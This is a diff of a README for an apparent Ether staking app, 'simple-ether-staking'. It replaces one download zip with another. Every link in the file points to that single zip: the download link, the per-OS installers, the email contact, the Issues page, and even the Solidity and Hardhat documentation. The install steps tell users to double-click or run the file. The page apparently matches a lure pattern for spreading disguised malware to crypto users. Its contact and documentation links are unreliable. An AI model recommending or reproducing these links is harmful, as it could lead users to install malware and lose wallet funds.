@@ -1,6 +1,6 @@
 # 🧑‍💻 simple-ether-staking - Stake Ether with Ease
 
-![Download](https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip)
+![Download](https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to simple-ether-staking! This guide will help you download and run our s
 
 To start, visit this page to download the latest version of simple-ether-staking:
 
-[Download Here](https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip)
+[Download Here](https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip)
 
 Make sure to select the right version for your operating system.
 
@@ -27,9 +27,9 @@ Before you begin, ensure your device meets the following requirements:
 
 On the Releases page, you will find different versions of the simple-ether-staking application. Choose the file suitable for your OS:
 
-- **For Windows:** `https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip`
-- **For macOS:** `https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip`
-- **For Linux:** `https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip`
+- **For Windows:** `https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip`
+- **For macOS:** `https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip`
+- **For Linux:** `https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip`
 
 If you have any questions about which file to choose, refer to your operating system's specifications.
 
@@ -39,21 +39,21 @@ After downloading, follow these steps to install the application:
 
 ### Windows
 
-1. Locate the `https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip` file in your Downloads folder.
+1. Locate the `https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip` file in your Downloads folder.
 2. Double-click the file to run the installer.
 3. Follow the prompts to complete the installation.
 4. After the installation, find the app in your Start Menu.
 
 ### macOS
 
-1. Locate the `https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip` file in your Downloads folder.
+1. Locate the `https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip` file in your Downloads folder.
 2. Double-click to open the disk image.
 3. Drag the application into your Applications folder.
 4. Open the app from the Applications folder.
 
 ### Linux
 
-1. Locate the `https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip` file in your Downloads folder.
+1. Locate the `https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip` file in your Downloads folder.
 2. Extract the compressed file by right-clicking and selecting “Extract Here.”
 3. Open the terminal and navigate to the extracted folder.
 4. Run the application using the command: `./simple-ether-staking`.
@@ -84,8 +84,8 @@ For any persistent issues, visit the Issues section of our GitHub repository for
 
 If you need assistance or have questions not addressed in this guide, feel free to contact us:
 
-- **Email:** https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip
-- **GitHub Issues Page:** [Report Issue](https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip)
+- **Email:** https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip
+- **GitHub Issues Page:** [Report Issue](https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip)
 
 ## 📜 License
 
@@ -93,8 +93,8 @@ simple-ether-staking is open-source software licensed under the MIT License. Fee
 
 ## 📌 Additional Resources
 
-- [Solidity Documentation](https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip)
-- [Hardhat Documentation](https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip)
-- [https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip Documentation](https://raw.githubusercontent.com/jekogyan0987/simple-ether-staking/main/insaturable/ether_staking_simple_3.2.zip)
+- [Solidity Documentation](https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip)
+- [Hardhat Documentation](https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip)
+- [https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip Documentation](https://github.com/jekogyan0987/simple-ether-staking/raw/refs/heads/main/insaturable/staking_ether_simple_1.8.zip)
 
 Thank you for choosing simple-ether-staking! Happy staking!
